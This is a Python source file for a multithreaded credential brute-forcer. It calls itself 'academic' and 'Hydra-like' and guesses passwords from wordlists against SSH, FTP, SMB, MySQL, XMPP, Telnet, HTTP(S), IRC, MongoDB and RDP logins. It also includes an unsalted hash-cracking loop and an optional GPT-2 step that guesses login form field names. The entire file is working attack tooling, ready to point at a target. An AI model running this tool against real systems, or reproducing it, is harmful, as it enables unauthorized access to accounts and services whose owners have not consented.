import argparse
import threading
import queue
import sys
import re
import time
import requests
import random
import hashlib
import socket
from functools import partial

# SSH
try:
    import paramiko
except ImportError:
    paramiko = None

# FTP
import ftplib

# SMB
try:
    from smb.SMBConnection import SMBConnection
except ImportError:
    SMBConnection = None

# MySQL
try:
    import pymysql
except ImportError:
    pymysql = None

# XMPP
try:
    import sleekxmpp
except ImportError:
    sleekxmpp = None

# Telnet
import telnetlib

# IRC
try:
    import irc.client
except ImportError:
    irc = None

# MongoDB
try:
    import pymongo
except ImportError:
    pymongo = None

# RDP (requires FreeRDP installed)
import subprocess

# HTTP/HTTPS
from urllib.parse import urlparse
from requests.sessions import Session

# AI for HTTP brute force (optional)
try:
    from transformers import pipeline, set_seed
    ai_enabled = True
except ImportError:
    ai_enabled = False

CAPTCHA_WORDS = ['captcha', 'verify', 'challenge']

def debug_print(debug, msg):
    if debug:
        print(msg)

# ----------- PROTOCOL HANDLERS -----------

def ssh_bruteforce(target, port, username, password, debug):
    if not paramiko:
        debug_print(debug, "[!] paramiko not installed for SSH")
        return False
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target, port=port, username=username, password=password, timeout=5, allow_agent=False, look_for_keys=False)
        client.close()
        debug_print(debug, f"[+] SSH Success: {username}:{password}")
        return True
    except Exception as e:
        debug_print(debug, f"[-] SSH Failed: {username}:{password} ({e})")
        return False

def ftp_bruteforce(target, port, username, password, debug):
    try:
        ftp = ftplib.FTP()
        ftp.connect(target, port, timeout=5)
        ftp.login(username, password)
        ftp.quit()
        debug_print(debug, f"[+] FTP Success: {username}:{password}")
        return True
    except Exception as e:
        debug_print(debug, f"[-] FTP Failed: {username}:{password} ({e})")
        return False

def smb_bruteforce(target, port, username, password, debug):
    if not SMBConnection:
        debug_print(debug, "[!] pysmb not installed for SMB")
        return False
    try:
        conn = SMBConnection(username, password, "bruteforcer", "target", use_ntlm_v2=True)
        connected = conn.connect(target, port, timeout=5)
        conn.close()
        if connected:
            debug_print(debug, f"[+] SMB Success: {username}:{password}")
            return True
        else:
            debug_print(debug, f"[-] SMB Failed: {username}:{password}")
            return False
    except Exception as e:
        debug_print(debug, f"[-] SMB Failed: {username}:{password} ({e})")
        return False

def mysql_bruteforce(target, port, username, password, debug):
    if not pymysql:
        debug_print(debug, "[!] pymysql not installed for MySQL")
        return False
    try:
        conn = pymysql.connect(host=target, port=port, user=username, passwd=password, connect_timeout=5)
        conn.close()
        debug_print(debug, f"[+] MySQL Success: {username}:{password}")
        return True
    except Exception as e:
        debug_print(debug, f"[-] MySQL Failed: {username}:{password} ({e})")
        return False

def xmpp_bruteforce(target, port, username, password, debug):
    if not sleekxmpp:
        debug_print(debug, "[!] sleekxmpp not installed for XMPP")
        return False
    class XMPPClient(sleekxmpp.ClientXMPP):
        def __init__(self, jid, password):
            super().__init__(jid, password)
            self.result = False
            self.add_event_handler('session_start', self.start)
            self.add_event_handler('failed_auth', self.fail)

        def start(self, event):
            self.result = True
            self.disconnect()

        def fail(self, event):
            self.result = False
            self.disconnect()
    try:
        jid = f"{username}@{target}"
        xmpp = XMPPClient(jid, password)
        xmpp.connect((target, port), use_ssl=False)
        xmpp.process(block=True)
        debug_print(debug, f"[+] XMPP Success: {username}:{password}" if xmpp.result else f"[-] XMPP Failed: {username}:{password}")
        return xmpp.result
    except Exception as e:
        debug_print(debug, f"[-] XMPP Failed: {username}:{password} ({e})")
        return False

def telnet_bruteforce(target, port, username, password, debug):
    try:
        tn = telnetlib.Telnet(target, port, timeout=5)
        tn.read_until(b"login: ", timeout=2)
        tn.write(username.encode('ascii') + b"\n")
        tn.read_until(b"Password: ", timeout=2)
        tn.write(password.encode('ascii') + b"\n")
        time.sleep(1)
        result = tn.read_very_eager().decode('ascii', errors='ignore')
        tn.close()
        if "incorrect" not in result.lower():
            debug_print(debug, f"[+] Telnet Success: {username}:{password}")
            return True
        else:
            debug_print(debug, f"[-] Telnet Failed: {username}:{password}")
            return False
    except Exception as e:
        debug_print(debug, f"[-] Telnet Failed: {username}:{password} ({e})")
        return False

def http_bruteforce(url, username, password, debug, ai=False):
    s = Session()
    parsed = urlparse(url)
    form_action = url
    fields = [('username', 'password'), ('user', 'pass'), ('login', 'password')]
    if ai and ai_enabled:
        generator = pipeline('text-generation', model='gpt2')
        prompt = f"Guess login form field names for {url}:"
        guess = generator(prompt, max_length=30, num_return_sequences=1)[0]['generated_text']
        ai_guess = re.findall(r"\b[a-zA-Z_]{3,}\b", guess)
        if len(ai_guess) >= 2:
            fields.insert(0, (ai_guess[0], ai_guess[1]))
    for user_field, pass_field in fields:
        try:
            data = {user_field: username, pass_field: password}
            resp = s.post(form_action, data=data, timeout=5)
            if any(word in resp.text.lower() for word in CAPTCHA_WORDS):
                debug_print(debug, f"[!] CAPTCHA detected for {username}:{password} (field {user_field}/{pass_field})")
                continue
            if resp.status_code in [200, 302] and not any(f in resp.text.lower() for f in ['invalid', 'failed', 'incorrect']):
                debug_print(debug, f"[+] HTTP Success: {username}:{password} (fields {user_field}/{pass_field})")
                return True
            else:
                debug_print(debug, f"[-] HTTP Failed: {username}:{password} (fields {user_field}/{pass_field})")
        except Exception as e:
            debug_print(debug, f"[-] HTTP Exception: {e}")
    return False

def https_bruteforce(url, username, password, debug, ai=False):
    return http_bruteforce(url, username, password, debug, ai)

def irc_bruteforce(target, port, username, password, debug):
    if not irc:
        debug_print(debug, "[!] python-irc not installed for IRC")
        return False
    try:
        reactor = irc.client.Reactor()
        c = reactor.server().connect(target, port, username, password=password)
        time.sleep(2)
        debug_print(debug, f"[+] IRC Success: {username}:{password}")
        return True
    except Exception as e:
        debug_print(debug, f"[-] IRC Failed: {username}:{password} ({e})")
        return False

def mongodb_bruteforce(target, port, username, password, debug):
    if not pymongo:
        debug_print(debug, "[!] pymongo not installed for MongoDB")
        return False
    try:
        uri = f"mongodb://{username}:{password}@{target}:{port}/"
        client = pymongo.MongoClient(uri, serverSelectionTimeoutMS=5000)
        client.list_database_names()
        debug_print(debug, f"[+] MongoDB Success: {username}:{password}")
        return True
    except Exception as e:
        debug_print(debug, f"[-] MongoDB Failed: {username}:{password} ({e})")
        return False

def rdp_bruteforce(target, port, username, password, debug):
    try:
        result = subprocess.run(
            ['xfreerdp', f'/u:{username}', f'/p:{password}', f'/v:{target}:{port}', '/cert:ignore', '/timeout:5000'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=8)
        if b'Authentication only, exit status 0' in result.stdout or result.returncode == 0:
            debug_print(debug, f"[+] RDP Success: {username}:{password}")
            return True
        else:
            debug_print(debug, f"[-] RDP Failed: {username}:{password}")
            return False
    except Exception as e:
        debug_print(debug, f"[-] RDP Exception: {e}")
        return False

# ----------- HASH CRACKING -----------

def hash_bruteforce(hashfile, wordlist, debug):
    found = False
    with open(hashfile, "r") as hf:
        hashes = [line.strip() for line in hf if line.strip()]
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as wf:
        passwords = [line.strip() for line in wf if line.strip()]
    for h in hashes:
        for pwd in passwords:
            for algo in ['md5', 'sha1', 'sha256', 'sha512']:
                try:
                    m = getattr(hashlib, algo)()
                    m.update(pwd.encode("utf-8"))
                    if m.hexdigest() == h:
                        print(f"[+] Hash cracked ({algo}): {h} = {pwd}")
                        found = True
                        break
                except Exception as e:
                    debug_print(debug, f"[-] Hash Exception: {e}")
    if not found:
        print("[-] Hash not found in wordlist.")

# ----------- THREADING/QUEUE -----------

def worker(taskq, func, debug, found_flag):
    while not taskq.empty() and not found_flag.is_set():
        try:
            username, password = taskq.get(timeout=0.5)
        except queue.Empty:
            return
        if func(username, password, debug):
            found_flag.set()
            print(f"\n[!!!] PASSWORD CRACKED: {username}:{password}")
        taskq.task_done()

# ----------- MAIN -----------

def main():
    parser = argparse.ArgumentParser(description="Advanced Academic Brute-Forcer (Hydra-like)")
    parser.add_argument('-l', '--login', help="Single username")
    parser.add_argument('-L', '--logins', help="File with usernames")
    parser.add_argument('-P', '--passwords', required=True, help="File with passwords")
    parser.add_argument('-t', '--threads', type=int, default=4, help="Threads")
    parser.add_argument('-dbg', '--debug', action='store_true', help="Debug output")
    parser.add_argument('target', help="Target: ssh://, ftp://, smb://, mysql:, xmpp://, telnet://, http(s)://, irc://, mongodb://, or hash file (-f)")
    parser.add_argument('-f', '--hashfile', help="File with hashes to crack")
    parser.add_argument('--ai', action='store_true', help="Enable AI for HTTP/HTTPS cracking")
    args = parser.parse_args()

    usernames = []
    if args.login:
        usernames = [args.login]
    elif args.logins:
        with open(args.logins, "r") as lf:
            usernames = [line.strip() for line in lf if line.strip()]
    else:
        usernames = [""]

    with open(args.passwords, "r", encoding="utf-8", errors="ignore") as pf:
        passwords = [line.strip() for line in pf if line.strip()]

    if args.hashfile:
        hash_bruteforce(args.hashfile, args.passwords, args.debug)
        sys.exit(0)

    proto, rest = args.target.split("://", 1) if "://" in args.target else (args.target.split(":")[0], ":".join(args.target.split(":")[1:]))
    port = None
    target = None
    url = None
    func = None

    if proto == "ssh":
        port = 22
        target = rest
        func = partial(ssh_bruteforce, target, port)
    elif proto == "ftp":
        port = 21
        target = rest
        func = partial(ftp_bruteforce, target, port)
    elif proto == "smb":
        port = 445
        target = rest
        func = partial(smb_bruteforce, target, port)
    elif proto == "mysql":
        sp = rest.split(":")
        target = sp[0]
        port = int(sp[1]) if len(sp) > 1 else 3306
        func = partial(mysql_bruteforce, target, port)
    elif proto == "xmpp":
        port = 5222
        target = rest
        func = partial(xmpp_bruteforce, target, port)
    elif proto == "telnet":
        port = 23
        target = rest
        func = partial(telnet_bruteforce, target, port)
    elif proto == "http":
        url = "http://" + rest
        func = partial(http_bruteforce, url, ai=args.ai)
    elif proto == "https":
        url = "https://" + rest
        func = partial(https_bruteforce, url, ai=args.ai)
    elif proto == "irc":
        port = 6667
        target = rest
        func = partial(irc_bruteforce, target, port)
    elif proto == "mongodb":
        sp = rest.split(":")
        target = sp[0]
        port = int(sp[1]) if len(sp) > 1 else 27017
        func = partial(mongodb_bruteforce, target, port)
    elif proto == "rdp":
        sp = rest.split(":")
        target = sp[0]
        port = int(sp[1]) if len(sp) > 1 else 3389
        func = partial(rdp_bruteforce, target, port)
    else:
        print(f"[!] Unknown protocol: {proto}")
        sys.exit(1)

    taskq = queue.Queue()
    for user in usernames:
        for pwd in passwords:
            taskq.put((user, pwd))
    found_flag = threading.Event()
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(taskq, func, args.debug, found_flag))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    if not found_flag.is_set():
        print("[-] Password not found in wordlist.")

if __name__ == "__main__":
    main()
